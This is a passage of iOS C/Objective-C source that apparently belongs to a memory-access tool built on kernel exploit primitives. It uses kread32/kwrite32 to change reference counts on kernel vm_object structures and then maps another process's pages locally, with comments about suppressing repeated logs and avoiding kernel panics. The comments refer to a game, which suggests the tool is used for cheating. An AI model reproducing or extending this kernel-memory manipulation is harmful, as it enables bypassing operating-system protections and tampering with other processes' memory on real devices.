            // the mapping reads wrong bytes while looking successful. Giving this
            // the same guard the other write has is a behaviour change and was not
            // part of removing the logs; it is a separate decision.
        } else {
            // This branch means the layout assumption did not hold on this device,
            // so it is worth saying once. It fired per remap before, which is the
            // worst possible ratio for a line that only ever reports the same
            // single fact: if the offset cannot be found, it cannot be found on
            // the next remap either, and the run is already degraded by it.
            static uint32_t s_skipLogged = 0;
            if (s_skipLogged < 4) {
                s_skipLogged++;
                NSLog(@"[DS] named_entry.offset not located (got 0x%x, writable "
                      @"block is [0x00,0x%x)) — further ones suppressed",
                      (unsigned)offAt, (unsigned)VNE_BLOCK_BYTES);
            }
        }
    }

    // No unlock here: g_vmRemapLock is owned by vm_create_shmem_with_object(),
    // which releases it once we return.

    mach_vm_address_t mappedAddr = 0;
    vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
    vm_prot_t maxProt = VM_PROT_ALL | VM_PROT_IS_MASK;

    // Named entry is one page → map offset must be 0.
    ret = mach_vm_map(mach_task_self_, &mappedAddr, PAGE_SIZE, 0,
                       VM_FLAGS_ANYWHERE, memoryObject,
                       0,
                       FALSE, curProt, maxProt, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS) {
        printf("[DS][%s:%d] mach_vm_map failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
        mappedAddr = 0;
        if (MACH_PORT_VALID(memoryObject)) {
            mach_port_deallocate(mach_task_self_, memoryObject);
            memoryObject = MACH_PORT_NULL;
        }
        // Undo the manual ref bump — otherwise FF keeps a phantom reference
        // and later hits vm_page_validate_no_references panic.
        if (bumpedRef) {
            uint32_t rc = kread32(object->address + off_vm_object_ref_count);
            if (rc > 0) kwrite32(object->address + off_vm_object_ref_count, rc - 1);
            bumpedRef = NO;
        }
    }
    (void)bumpedRef;

    ret = mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
    if (ret != KERN_SUCCESS)
        printf("[DS][%s:%d] mach_vm_deallocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));

    shmem.port          = (uint64_t)memoryObject;
    shmem.remoteAddress = object->vmAddress;
    shmem.localAddress  = (uint64_t)mappedAddr;
    shmem.used          = (mappedAddr != 0);

    return shmem;
}

struct VMShmem vm_create_shmem_with_object(struct VMObject *object)
{
    pthread_mutex_lock(&g_vmRemapLock);
    struct VMShmem shmem = vm_create_shmem_with_object_locked(object);
    pthread_mutex_unlock(&g_vmRemapLock);
    return shmem;
}

struct VMShmem vm_map_remote_page(uint64_t vmMap, uint64_t address)
{
    struct VMShmem shmem = {0};
    struct VMObject vmObject = vm_get_object(vmMap, address);
    if (!vmObject.address)
    {
        // Same reasoning as the no-entry case above, and this one fires from the
        // same moment: a lookup for a page the game has already torn down. It was
        // the loudest line in the file, once per failed miss, for as long as the
        // stale pointers kept being followed.
        static uint32_t s_noObjLogged = 0;
        if (s_noObjLogged < 4) {
            s_noObjLogged++;
            NSLog(@"[DS] vm_map_remote_page: no object for addr=0x%llx "
                  @"(further ones suppressed)",
                  (unsigned long long)address);
        }
        return shmem;
    }

    return vm_create_shmem_with_object(&vmObject);
}
